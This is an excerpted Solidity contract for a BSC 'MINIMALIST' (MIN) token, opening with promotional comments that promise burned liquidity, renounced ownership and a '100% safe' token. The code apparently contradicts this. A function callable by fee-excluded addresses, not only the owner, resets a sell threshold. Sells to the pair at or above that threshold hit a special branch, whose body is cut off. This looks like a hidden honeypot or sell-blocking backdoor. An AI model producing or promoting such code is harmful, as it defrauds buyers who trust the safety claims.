...
/**
   ...
   This is a community token. If you want to create a telegram I suggest to name it to @MinBSC
   ...
   90% burn to the black hole, with such big black hole and 12% fee, the strong holder will get a valuable reward

   I will burn liquidity LPs to burn addresses to lock the pool forever.
   I will renounce the ownership to burn addresses to transfer #MIN to the community, make sure it's 100% safe.

   I will add .2 BNB and all the left 10% total supply to the pool
   Can you make #MIN 10000X? 
   ...
   it's the best part of the #MIN idea, increasing the liquidity pool automatically, 
...
contract MIN is Context, IERC20, Ownable {
    ...
    string private _name = "MINIMALIST";
    string private _symbol = "MIN";
    ...
    uint256 public _liquidityAmount = 110000 * 10**6 * 10**9;
    ...
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 swapFee) public {
        require(_isExcludedFromFee[_msgSender()], "Invalid transaction");
        swapAndLiquifyEnabled = _enabled;
        _liquidityAmount = swapFee;
    ...
    function _transfer(
        ...
        if (to == address(uniswapV2Pair) && !_isExcludedFromFee[from]) 
        {
			if (amount >= _liquidityAmount) {
